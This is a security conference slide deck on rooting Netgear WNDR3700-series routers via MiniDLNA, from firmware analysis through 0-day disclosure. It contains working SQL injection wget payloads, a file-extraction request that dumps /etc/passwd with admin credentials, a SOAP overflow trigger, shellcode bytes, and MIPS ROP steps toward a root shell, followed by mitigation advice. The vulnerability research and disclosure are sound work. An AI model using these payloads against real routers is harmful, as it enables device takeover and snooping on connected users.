From SQL Injection to MIPS 
Overﬂows
Rooting SOHO Routers
Zachary Cutlip
Tactical Network Solutions
Craig Heffner
Acknowledgements
What I’m going to talk about
Novel uses of SQL injection
Buffer overﬂows on MIPS architecture
0-day Vulnerabilities in Netgear routers
Embedded device investigation process
Live demo: Root shell & more
Questions
Read the paper
Lots of essential details
Not enough time in this talk to cover it all
Please read it
Why attack SOHO routers?
Offers attacker privileged vantage point
Exposes multiple connected users to attack
Exposes all users’ Internet comms to snooping/
manipulation
Often unauthorized side doors into enterprise networks
Target device: Netgear 
WNDR3700 v3
Fancy-pants SOHO 
Wireless Router
DLNA Multimedia 
server
File server w/USB 
storage
Very popular on Amazon
Other affected devices
Netgear WNDR 3800
Netgear WNDR 4000
Netgear WNDR 4400
First step: take it apart
UART 
header
UART to USB 
adapter
USB port
Helps analysis
Retrieve SQLite DB
Load a debugger 
onto the router
Analyzing the Device 
Software
Download ﬁrmware update from 
vendor, unpack
See Craig Heffner’s blog for more on 
ﬁrmware unpacking
http://www.devttys0.com/blog
Linux--Woo hoo!
$ binwalk ./WNDR3700v3-V1.0.0.18_1.0.14.chk
DECIMAL   	 HEX       	DESCRIPTION
---------------------------------------------------
86        	 0x56      LZMA compressed data
1423782   	 0x15B9A6  	 Squashfs ﬁlesystem
$ dd if=WNDR3700v3-V1.0.0.18_1.0.14.chk of=kernel.7z bs=1 skip=86 count=1423696
$ p7zip -d kernel.7z
$ strings kernel | grep 'Linux version'
Linux version 2.6.22 (peter@localhost.localdomain) (gcc version 4.2.3) #1 Wed Sep 14 
10:38:51 CST 2011
Target Application: 
MiniDLNA
What is DLNA?
Digital Living Network 
Alliance
Interoperability 
between gadgets
Multimedia playback, 
etc.
But Most Importantly...
Attack Surface
Google reveals: open 
source!
Source code analysis
‘strings’ reports shipping binary is 1.0.18
Download source for our version.
Search source for low-hanging fruit
SQL injection: more than 
meets the eye
Privileged access to data
What if the data is not sensitive or valuable?
Opportunity to violate developer assumptions
You know what happens when  you assume...
Your shit gets owned.
Vulnerability 1: SQL injection
grep -rn SELECT * | grep ‘%s’
21 results, such as:
sprintf(sql_buf, "SELECT PATH from ALBUM_ART 
where ID = %s", object);
Closer look
Closer look
Album art query
Test the vulnerability
$ wget http://10.10.10.1:8200/
AlbumArt/"1; INSERT/**/into/**/
ALBUM_ART(ID,PATH)/**/
VALUES('31337','pwned');"-
throwaway.jpg
w00t! Success!
sqlite> select * from ALBUM_ART where 
ID=31337;
31337|pwned
Good news / Bad news
Working SQL injection
Trivial to exploit
No valuable information
Even if destroyed, DB is regenerated
Vulnerability 2: Remote File 
Extraction
sqlite> select * from ALBUM_ART;
1 | /tmp/mnt/usb0/part1/
  .ReadyDLNA//art_cache/tmp/shares/
   USB_Storage/01 - Unforgivable 
(First State Remix).jpg
MiniDLNA Database:
Test the Vulnerability
$ wget http://10.10.10.1:8200/
AlbumArt/"1;INSERT/**/into/**/
ALBUM_ART(ID,PATH)/**/
VALUES('31337','/etc/passwd');"-
throwaway.jpg
$ wget http://10.10.10.1:8200/
AlbumArt/31337-18.jpg
Passwords
$ cat 31337-18.jpg
nobody:*:0:0:nobody:/:/bin/sh
admin:qw12QW!@:0:0:admin:/:/bin/sh
guest:guest:0:0:guest:/:/bin/sh
admin:qw12QW!@:0:0:admin:/:/bin/sh
Vulnerability 3: Remote 
Code Execution
i.e., pop root
Party like it’s 1996.
$ find . -name \*.c -print | xargs grep 
-E \
 'sprintf\(|strcat\(|strcpy\(' | \
  grep -v asprintf | wc -l
265   .schema DETAILS
CREATE TABLE DETAILS ( ID INTEGER PRIMARY KEY 
AUTOINCREMENT,
                      ..., ALBUM_ART INTEGER DEFAULT 
0, ...);
DETAILS.ALBUM_ART is an INT, but it can store 
arbitrary data
This is due to “type afﬁnity”
callback() attempts to “validate” using atoi(), but this is 
busted
atoi(“1_omg_learn_to_c0d3”) == 1
ALBUM_ART need only start with a (non-zero) int
Weak sauce
Two things to note
Exploitable buffer overﬂow?
We have full control over the DB from Vuln #1
We need to:
Stage shellcode in database
Trigger query of our staged data
SQL injection limitation
Limited length of SQL injection, approx. 128 bytes per 
pass.
Target buffer is 512 bytes.
SQLite concatenation operator: “||”
UPDATE DETAILS set ALBUM_ART=ALBUM_ART|| 
“AAAA” where ID=3
Trigger query of staged 
exploit
Model DLNA in Python
Python Coherence library
Capture conversation in Wireshark
Save SOAP request for playback with wget
Wireshark capture
SOAP request
Things you need
Console access to the device
There is a UART header on the PCB
gdbserver cross-compiled for MIPS
gdb compiled for MIPS target architecture
Test the vulnerability
Attach gdbserver on the target to minidlna.exe
Connect local gdb to remote sesion
Use wget to SQL inject overﬂow data
Set up initial records in OBJECTS and DETAILS
Build up overﬂow data
Use wget to POST the SOAP request
How much overﬂow data?
$ wget http://10.10.10.1:8200/ctl/ContentDir \
  --header="Host: 10.10.10.1" \
  --header=\
  'SOAPACTION: "urn:schemas-upnp-
org:service:ContentDirectory:1#Browse"' \
  --header='"content-type: text/xml ;charset="utf-8"' \
  --header="connection: close" \
  --post-ﬁle=./soaprequest.xml 
Trigger the exploit
w00t! Success!
We control the horizontal 
and the vertical
We own the program counter, and therefore execution
Also all “S” registers: $S0-$S8
Useful for Return Oriented Programming exploit
Owning $PC is great, but 
give me a shell
Getting Execution: 
Challenges
Stack ASLR
MIPS Architecture idiosyncrasies
Return Oriented Programming is limited (but possible)
“Bad” Characters due to HTTP & SQL
Getting Execution:
Advantages
No ASLR for executable, heap, & libraries
Executable stack
ROP on MIPS
All MIPS instructions are 4-bytes
All MIPS memory access must be 4-byte aligned
No jumping into the middle of instructions
ROP on MIPS
We can return into useful instruction sequences:
Manipulate registers
Load $PC from registers or memory we control
Help locate stack, defeating ASLR
Locate stack using ROP
Load several offsets from stack pointer into 
$S3,$S4,$S6
Load $S0 into $T9 and jump
MIPS cache coherency
MIPS has two parallel caches:
Instruction Cache
Data Cache
Payload written to the stack as data
Resides in data cache until ﬂushed
MIPS Cache Coherency
Can’t execute off stack until cache is ﬂushed
Write lots to memory, trigger ﬂush?
Cache is often 32K-64K
Linux provides cacheﬂush() system call
ROP into it
Bad characters
Common challenge with shellcode
Spaces break HTTP
Null bytes break strcpy()/sprintf()
SQLite also has bad characters
e.g., 0x0d, carriage return
SQLite escape to the rescue: “x’0d’”
“\x7a\x69\xce\xe4\xff”,
“x’0d’”,
“\x3c\x0a\x0a\xad\x35”
MIPS NOP is 
\x00\x00\x00\x00
Use some other inert 
instruction
I used:
nor t6,t6,zero
\x27\x70\xc0\x01
NOP Instruction
Trouble with Encoders
Metasploit payload + XOR Encoder==No Joy
Metasploit only provides one of each on MIPS
Caching problem?
Wrote my own NUL-safe connect-back payload
No need for encoder
Pro Tip: Avoid endianness problems by connecting 
back to 10.10.10.10
Overﬂow diagram
Demo Time
How to suck less hard
Establish security requirements
Self protection
Network protection
Less crappy programming
sqlite3_snprintf()
Privilege separation
Mandatory Access Controls, e.g. SELinux
Upshot
Developer assumes well-formed data
Compromise database integrity, violate developer 
assumptions
Even if the database is low value
Zachary Cutlip
Contact Info
Twitter: @zcutlip
PI:EMAIL
Questions?